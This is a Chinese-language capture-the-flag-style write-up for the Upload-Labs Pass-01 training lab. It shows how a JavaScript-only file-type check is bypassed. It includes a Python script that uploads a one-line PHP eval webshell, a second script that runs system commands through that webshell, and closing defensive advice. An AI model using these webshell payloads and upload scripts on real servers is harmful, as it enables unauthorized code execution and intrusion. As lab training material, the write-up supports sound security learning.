# Upload‑Labs Pass‑01

## 题目描述
靶场页面提供文件选择框与上传按钮。通过前端 JavaScript 限制仅允许上传 `jpg/png/gif` 图片格式。
如果在网页直接选择php文件上传，会浏览器弹窗提示**该文件不允许上传**，请求根本不会发送到后端服务器。
漏洞关键点：**校验逻辑全部写在前端，后端PHP代码没有做任何后缀校验**。

前端JS源码：
```javascript
function checkFile() {
    var allow_ext = ".jpg|.png|.gif";
    var ext_name = file.substring(file.lastIndexOf("."));
    if (allow_ext.indexOf(ext_name) == -1) {
        alert("该文件不允许上传...");
        return false;
    }
}
```

后端 PHP 源码：
```
$temp_file = $_FILES['upload_file']['tmp_name'];
$img_path  = UPLOAD_PATH . '/' . $_FILES['upload_file']['name'];
if (move_uploaded_file($temp_file, $img_path)) {
    $is_upload = true;
}
```

## 解题思路
JS 校验运行在浏览器客户端，只对网页页面的操作生效。
不使用浏览器上传，直接使用 Python 构造 HTTP 上传请求发送给后端，完全绕过前端 JS 限制，上传 PHP 后门文件。
> 
> 本次练习不使用蚁剑工具，使用 Python 发送 POST 请求验证一句话木马命令执行。

## 解题步骤
1. **环境准备**
在 `upload‑labs`**根目录**新建 `upload` 文件夹，赋予读写权限，若文件夹不存在会提示「上传出错！」。

2. **Python 脚本上传一句话木马**
新建 `pass01.py`，脚本直接构造 multipart 上传数据包，上传一句话后门。

```
import requests

BASE = "http://127.0.0.1/upload-labs/"
s = requests.Session()
s.get(BASE + "Pass-01/index.php", timeout=15)

# 一句话木马 payload
payload = b"<?php @eval($_POST['cmd']); ?>"

files = {
    "upload_file": ("shell01.php", payload, "application/octet-stream")
}

r = s.post(BASE + "Pass-01/index.php", files=files, data={"submit":"上传"}, timeout=15)
print("上传页面返回：")
print(r.text)
```

cmd 执行运行脚本：
```
python pass01.py
```

页面返回上传成功，文件保存路径：
`http://127.0.0.1/upload-labs/upload/shell01.php`

> 
> ⚠️注意：直接浏览器 GET 访问该地址页面为空白，属于正常现象。
> 一句话木马依靠接收 POST 参数执行代码，GET 访问没有传入参数不会输出任何内容。

3. **Python 脚本 POST 验证命令执行**（代替蚁剑）
新建 `exec_cmd.py`，向一句话发送 POST 数据执行系统命令。

```
import requests

shell_url = "http://127.0.0.1/upload-labs/upload/shell01.php"
post_data = {
    "cmd": "system('dir');"
}

resp = requests.post(shell_url, data=post_data)
print(resp.text)
```

运行脚本：
```
python exec_cmd.py
```

成功返回 upload 目录文件列表，可以看到 `shell01.php`，证明后门代码执行成功，完成 getshell。
> 
> Windows cmd 出现中文乱码可以先执行：
> 
> 
> ```
> chcp 65001
> ```

## 踩坑记录
1. `upload` 文件夹必须建立在 `upload‑labs` 根目录，不要建在 Pass‑01 子目录，否则提示上传出错。
2. upload 文件夹需要开启读写权限，否则上传失败。
3. 浏览器直接访问 shell 页面空白不是上传失败，需要 POST 传入参数才会执行命令。
4. Windows 控制台输出中文会乱码，执行`chcp 65001`切换为 UTF‑8 编码可缓解乱码。

## 知识点总结
1. 前端 JS 校验属于**客户端校验**，完全可以绕过；安全校验逻辑必须放在服务端实现。
2. `eval()` 函数会把传入的字符串当做 PHP 代码执行，一句话 webshell 就是利用此特性。
3. 一句话木马本身不会页面回显，需要 POST 传入控制参数；不一定需要蚁剑工具，原生 HTTP 请求即可完成利用。
4. **上传成功 ≠ getshell**，必须验证上传后的脚本代码可以执行才算完成漏洞利用。

## 防御思路
1. 后端对上传文件后缀做白名单校验，不要只依靠前端限制。
2. 将上传目录设置为禁止 PHP 脚本解析。
3. 对上传文件进行重命名处理。
